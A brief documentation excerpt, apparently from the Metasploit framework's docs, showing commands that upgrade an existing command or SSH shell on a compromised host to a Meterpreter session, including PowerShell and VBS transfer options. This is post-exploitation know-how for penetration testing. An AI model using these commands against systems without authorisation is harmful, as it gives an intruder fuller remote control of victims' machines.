## Upgrading shells to Meterpreter

If you have an existing session, either Meterpreter, an SSH, or a basic command shell - you can open a new Meterpreter session with:

```
sessions -u 3
```

To upgrade the most recently opened session to Meterpreter using the `sessions` command:

```
sessions -u -1
```

Or run the `shell_to_meterpreter` module manually:

```
use multi/manage/shell_to_meterpreter
run session=-1
run session=-1 win_transfer=POWERSHELL
run session=-1 win_transfer=VBS
```
